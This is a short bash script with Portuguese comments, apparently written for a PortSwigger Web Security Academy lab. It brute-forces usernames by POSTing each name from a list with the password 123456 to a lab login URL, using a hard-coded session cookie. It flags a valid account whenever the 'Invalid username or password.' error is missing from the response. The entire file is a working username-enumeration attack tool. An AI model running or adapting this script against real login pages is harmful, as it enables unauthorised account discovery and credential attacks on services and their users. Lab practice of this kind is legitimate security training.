#!/bin/bash

user_list="$1" #lista de usuários

echo "Brute-forcing users..."

#Testar cada usuário da lista de candidatos
while read -r line; do
        user="$line"
        echo $user
        request=$(curl -d "username=$user&password=123456" --cookie "session=OKoR6v2DCHNvaXypTW8U7KmWM1R2q6H0" -X POST https://0a86006103b59940c33e0cda000700d5.web-security-academy.net/login )
        
        #Se não achar esta mensagem de erro, então é um possível usuário
        if [[ $request != *"Invalid username or password."* ]]; then
                echo $user "FOUND!!!"
                break
        fi
done < "$user_list"
